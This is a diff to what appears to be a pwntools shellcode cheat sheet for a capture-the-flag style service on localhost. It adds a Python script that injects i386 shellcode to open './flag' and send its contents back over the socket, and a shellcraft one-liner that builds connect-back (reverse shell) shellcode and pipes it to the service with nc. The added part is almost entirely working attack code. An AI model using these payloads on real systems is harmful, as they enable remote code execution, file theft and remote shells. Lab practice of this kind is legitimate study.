@@ -44,8 +44,25 @@ while 1:
     print parse_getdents(rv)
 ```
 
-### sendfile
-``empty yet``
+### sendfile = open_file + sendfile
+```python
+#!python
+
+from pwn import *
+context('i386', 'linux')
+
+HOST = 'localhost'
+PORT = 31337
+
+s = remote(HOST, PORT)
+
+sc = ''
+sc += asm(shellcode.open_file('./flag'))
+sc += asm(shellcode.sendfile(in_fd=3, out_fd=4))
+
+s.send(sc + '\n')
+print s.recvall()
+```
 
 ### connectback
-``empty yet``
+``shellcraft -c i386 connectback localhost 31338 3 -f r | nc localhost 31337``
